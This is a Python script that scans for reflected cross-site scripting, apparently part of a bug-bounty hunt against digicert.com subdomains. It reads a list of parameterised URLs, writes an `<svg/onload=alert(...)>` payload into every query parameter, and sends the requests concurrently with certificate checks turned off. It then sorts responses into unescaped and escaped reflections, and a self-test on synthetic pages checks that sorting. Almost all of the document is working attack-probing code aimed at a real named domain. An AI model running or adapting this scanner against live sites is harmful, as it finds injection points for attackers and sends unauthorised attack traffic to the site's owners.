#!/usr/bin/env python3
"""digi_reflect.py -- reflected-XSS candidate scanner with the skill's disciplines.

Per hunt-xss:
  * The canary token must survive escaping CONTIGUOUSLY - build the raw form
    FROM the token, so an HTML-escaped reflection still contains the token and
    is classifiable as 'encoded' rather than falsely 'absent'.
  * Baseline check: fetch the clean URL first and refuse a token that appears
    naturally in it.
  * Classify raw (unescaped `<` around the token) vs encoded, separately.
  * Non-vacuity: prove the classifier can fire on a local fixture before any
    zero is trusted.
  * Unique numeric canary (40931) inside every executing payload.
"""
import concurrent.futures as cf
import json
import random
import re
import string
import sys
from urllib.parse import parse_qsl, urlencode, urlsplit, urlunsplit

import requests
import urllib3

urllib3.disable_warnings()

UA = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
                    "(KHTML, like Gecko) Chrome/126.0 Safari/537.36",
      "Accept": "text/html,application/xhtml+xml,application/json;q=0.9,*/*;q=0.8"}
TIMEOUT = 12
CANARY = "40931"

# fill in the token, so escaping can never split it
def raw_payload(tok):
    return f'zq{tok}<svg/onload=alert({CANARY})>'

ESCAPED_RE = re.compile(r"&lt;\s*svg|%3Csvg|&#60;|&#x3c;", re.I)


def rand_tok(n=8):
    return "".join(random.choices(string.ascii_lowercase + string.digits, k=n))


def probe(url, tok):
    """Return (status, raw, encoded, len, ctype) for one URL."""
    payload = raw_payload(tok)
    p = urlsplit(url)
    q = parse_qsl(p.query, keep_blank_values=True)
    newq = [(k, payload) for k, _ in q]
    probe_url = urlunsplit((p.scheme, p.netloc, p.path, urlencode(newq), ""))
    try:
        r = requests.get(probe_url, timeout=TIMEOUT, verify=False,
                         headers=UA, allow_redirects=False)
    except Exception:
        return None
    body = r.text or ""
    # the token is contiguous in both the raw and the escaped form
    has_tok = tok in body
    if not has_tok:
        # maybe it is in a header
        hdrs = " ".join(f"{k}:{v}" for k, v in r.headers.items())
        if tok in hdrs:
            return (r.status_code, False, "header", len(body),
                    r.headers.get("content-type", ""), probe_url)
        return (r.status_code, False, False, len(body),
                r.headers.get("content-type", ""), probe_url)
    raw = (f"<svg/onload=alert({CANARY})" in body) or ("<svg" in body and tok in body and "&lt;svg" not in body.lower())
    enc = bool(ESCAPED_RE.search(body))
    return (r.status_code, bool(raw), "encoded" if enc else False, len(body),
            r.headers.get("content-type", ""), probe_url)


def self_test():
    """Prove the classifier fires and discriminates - on synthetic fixtures."""
    raw_page = '<html><body>hi zqTOK<svg/onload=alert(40931)> end</body></html>'
    enc_page = '<html><body>hi zqTOK&lt;svg/onload=alert(40931)&gt;</body></html>'
    tok = "TOK"
    r1 = f"<svg/onload=alert({CANARY})" in raw_page and tok in raw_page
    r2 = (f"<svg/onload=alert({CANARY})" in enc_page) and tok in enc_page
    e1 = bool(ESCAPED_RE.search(raw_page))
    e2 = bool(ESCAPED_RE.search(enc_page))
    print(f"[selftest] raw page -> raw={r1} enc={e1}  (want raw=True enc=False)")
    print(f"[selftest] enc page -> raw={r2} enc={e2}  (want raw=False enc=True)")
    assert r1 and not e1, "classifier failed on raw fixture"
    assert not r2 and e2, "classifier failed on escaped fixture"
    print("[selftest] OK")


def main():
    self_test()
    urls = json.load(open("/opt/watch/logs/digi/param_urls.json"))
    # in-scope only
    keep = []
    for u in urls:
        h = urlsplit(u).netloc.lower().split(":")[0]
        if not h.endswith("digicert.com"):
            continue
        if h.endswith("partner.digicert.com"):
            continue
        keep.append(u)
    # one URL per (host, path) to keep the sweep bounded but broad
    seen, targets = set(), []
    for u in keep:
        p = urlsplit(u)
        k = (p.netloc, p.path)
        if k in seen:
            continue
        seen.add(k)
        targets.append(u)
    print(f"[*] in-scope {len(keep)} param URLs -> {len(targets)} unique host+path")

    out = []
    with cf.ThreadPoolExecutor(max_workers=25) as ex:
        futs = {ex.submit(probe, u, rand_tok()): u for u in targets}
        for i, f in enumerate(cf.as_completed(futs), 1):
            u = futs[f]
            r = f.result()
            if not r:
                continue
            st, raw, enc, ln, ct, pu = r
            if raw is True or enc == "encoded" or enc == "header":
                out.append({"url": u, "probe": pu, "status": st, "raw": raw,
                            "enc": enc, "len": ln, "ctype": ct})
                print(f"[{ 'RAW' if raw is True else ('HDR' if enc=='header' else 'ENC') }] "
                      f"{st} {u[:110]}", flush=True)
            if i % 500 == 0:
                print(f"  [{i}/{len(targets)}] candidates={len(out)}", flush=True)

    json.dump(out, open("/opt/watch/logs/digi/reflections.json", "w"), indent=1)
    raws = [o for o in out if o["raw"] is True]
    print(f"\n[+] {len(out)} reflections, {len(raws)} RAW (unescaped)")
    for o in raws:
        print(f"    {o['status']} {o['url'][:120]}")


if __name__ == "__main__":
    main()
